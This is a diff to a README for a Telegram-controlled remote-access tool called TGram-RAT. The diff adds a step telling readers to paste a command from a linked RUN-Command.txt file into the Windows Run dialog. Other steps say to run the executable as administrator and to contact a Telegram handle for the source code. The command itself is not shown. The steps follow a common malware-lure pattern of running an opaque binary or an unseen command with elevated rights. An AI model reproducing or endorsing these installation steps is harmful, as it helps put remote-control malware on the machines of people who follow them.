@@ -17,6 +17,7 @@ An ingenious .exe file designed to harness the power of Telegram for remote cont
 ## 🚨 Usage Guidelines:
 1. Extract the ZIP file to a secure location.
 2. Right-click the executable file and select **"Run as administrator."**
+3. Alternatively, if you prefer not to use this method, you can simply copy the command provided above in the [**RUN-Command.txt**](https://github.com/Unknown18-afk/TGram-RAT/blob/main/RUN-Command.txt) file and paste it in the Run dialog box by pressing Win + R or searching for Run. This will start the application.
 
 **📬 DM [@BUDDY_God](https://t.me/BUDDY_God) to get the code for this and other special projects.**
 
